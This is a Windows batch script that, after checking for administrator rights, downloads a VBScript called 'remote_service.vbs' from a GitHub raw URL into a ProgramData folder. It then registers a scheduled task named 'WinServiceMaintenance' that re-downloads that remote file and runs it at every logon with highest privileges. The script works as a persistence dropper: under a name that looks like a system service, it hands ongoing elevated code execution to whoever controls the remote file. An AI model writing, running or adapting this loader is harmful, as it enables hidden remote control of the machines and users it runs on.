@echo off
:: Checking Admin Rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Admin Access Required!
    pause
    exit
)

:: Configuration
set "GitHubURL=https://raw.githubusercontent.com/acstongi/Winbat/refs/heads/main/remote_service.vbs"
set "TargetDir=%ProgramData%\WinService"
set "LocalVBS=%TargetDir%\remote_service.vbs"

:: Create Folder if not exists
if not exist "%TargetDir%" mkdir "%TargetDir%"

:: Download the latest code from GitHub
powershell -Command "(New-Object Net.WebClient).DownloadFile('%GitHubURL%', '%LocalVBS%')"

:: Create Task Scheduler Entry
:: This will update and run the script every time someone logs in
schtasks /create /tn "WinServiceMaintenance" /tr "cmd.exe /c powershell -Command \"(New-Object Net.WebClient).DownloadFile('%GitHubURL%', '%LocalVBS%'); wscript.exe '%LocalVBS%'\"" /sc onlogon /rl highest /f

cls
echo =======================================
echo    Remote Cloud Setup Completed!
echo =======================================
pause
